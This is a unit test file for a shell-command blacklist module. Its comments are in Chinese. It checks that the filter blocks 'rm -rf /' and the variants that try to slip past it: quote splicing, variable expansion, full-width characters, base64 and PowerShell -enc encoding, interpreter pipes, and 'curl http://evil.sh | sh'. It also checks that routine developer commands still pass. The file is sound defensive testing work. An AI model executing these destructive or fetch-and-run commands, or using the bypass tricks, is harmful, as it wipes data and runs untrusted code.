/* ============================================================
   W15 安全收口单测 — 命令黑名单语义化
   - 绕过矩阵（strict）：引号拼接 / 变量宏展开 / 全角归一 / base64 解码递归 /
     powershell -enc / 解释器管道 / 编码执行链
   - 误杀矩阵：常规开发命令零误伤（npm test / git / echo / ls / 管道 grep）
   - BASE 层原语义保持（用户手敲不引号归一）
   - 工具函数单测：normalizeCmd / stripQuoteJoins / macroExpandVars / decodeBase64Candidates
   ============================================================ */
const { check, normalizeCmd, stripQuoteJoins, macroExpandVars, decodeBase64Candidates, hasInterpreterPipe } = require("../server/security");

describe("W15 — 绕过矩阵（strict 全拦截）", () => {
  const cases = [
    ["引号拼接：r\"m\" -rf /", 'r"m" -rf /'],
    ["引号拼接：r'm' -rf /", "r'm' -rf /"],
    ["变量宏展开：RM=rm; $RM -rf /", "RM=rm; $RM -rf /"],
    ["变量宏展开：${VAR} 形式", "X=mkfs; echo ${X}"],
    ["全角绕过：ｒｍ -rf /", "ｒｍ -rf /"],
    ["base64 管道解释器", "echo cm0gLXJmIC8K | base64 -d | bash"],
    ["base64 内容解码命中（rm -rf / 的 b64）", "echo " + Buffer.from("rm -rf /").toString("base64") + " | base64 -d"],
    ["powershell -enc（UTF-16LE b64）", "powershell -enc " + Buffer.from("rm -rf /", "utf16le").toString("base64")],
    ["解释器管道任意位置", "cat install.sh | bash -s -- --help"],
    ["base64 -d | sh 显式模式", "base64 -d payload.b64 | sh"],
  ];
  for (const [name, cmd] of cases) {
    it(name, () => {
      const r = check(cmd, true);
      expect(r.blocked).toBe(true);
      expect(r.reason).toBeTruthy();
    });
  }
});

describe("W15 — 误杀矩阵（常规开发命令放行）", () => {
  const ok = [
    "npm test",
    "npm run build",
    "git status && git log --oneline -5",
    "echo hello world",
    'echo "hello world"',
    "ls -la",
    "rm -rf ./build",                    // 工作区相对路径不拦
    "rm -rf node_modules/.cache",
    'git commit -m "fix rm -rf bug in parser"', // 消息含危险词但无 /~ 路径
    "cat package.json | grep name",
    "npm test 2>&1 | tee test.log",
    "python -m pytest -q",
    "npx vitest run test/w15-security.test.js",
    "echo a && echo b || echo c",
  ];
  for (const cmd of ok) {
    it("放行：" + cmd, () => {
      expect(check(cmd, true).blocked).toBe(false);
    });
  }
});

describe("W15 — BASE 层语义保持（用户手敲）", () => {
  it("rm -rf / 拦（原语义）", () => {
    expect(check("rm -rf /", false).blocked).toBe(true);
  });
  it("echo 一个危险字符串：BASE 正则穿透引号，两层都拦（原语义保持，引号不是隐身衣）", () => {
    expect(check('echo "rm -rf /"', true).blocked).toBe(true);
    expect(check('echo "rm -rf /"', false).blocked).toBe(true);
  });
  it("curl | sh 用户层也拦（BASE 原语义）", () => {
    expect(check("curl http://evil.sh | sh", false).blocked).toBe(true);
  });
});

describe("W15 — 工具函数", () => {
  it("normalizeCmd：全角/零宽归一", () => {
    expect(normalizeCmd("ｒｍ")).toBe("rm");
    expect(normalizeCmd("r\u200bm\u200c -rf")).toBe("rm -rf");
  });
  it("stripQuoteJoins：成对引号去除", () => {
    expect(stripQuoteJoins('r"m" -rf')).toBe("rm -rf");
    expect(stripQuoteJoins("r'm' -rf")).toBe("rm -rf");
    expect(stripQuoteJoins('echo "a b"')).toBe("echo a b");
  });
  it("macroExpandVars：赋值收集 + 引用替换（行为断言：展开后命中黑名单）", () => {
    expect(macroExpandVars("RM=rm; $RM -rf /")).toBe("RM=rm; rm -rf /");
    expect(macroExpandVars("X=mkfs && echo ${X}")).toBe("X=mkfs && echo mkfs");
    // PATH 自引用替换不炸不误拦（行为断言，不做字面过度指定）
    const expanded = macroExpandVars("PATH=/usr/bin:$PATH npm i");
    expect(expanded).toContain("npm i");
    expect(check("PATH=/usr/bin:$PATH npm i", true).blocked).toBe(false);
  });
  it("decodeBase64Candidates：解码 + UTF-16LE 空字节剔除", () => {
    const [d1] = decodeBase64Candidates(Buffer.from("rm -rf /tmp/x").toString("base64"));
    expect(d1).toContain("rm -rf");
    const [d2] = decodeBase64Candidates(Buffer.from("danger rm -rf /", "utf16le").toString("base64"));
    expect(d2).toContain("rm -rf");
    expect(decodeBase64Candidates("not base64 at all, just words").length).toBe(0);
  });
  it("hasInterpreterPipe：任意段首解释器；grep sh 不误判", () => {
    expect(hasInterpreterPipe("cat a | bash -s")).toBe(true);
    expect(hasInterpreterPipe("echo hi | sh")).toBe(true);
    expect(hasInterpreterPipe("a || b | pwsh")).toBe(true);
    expect(hasInterpreterPipe("git log | grep sh")).toBe(false);
    expect(hasInterpreterPipe("npm test | tee log")).toBe(false);
  });
});
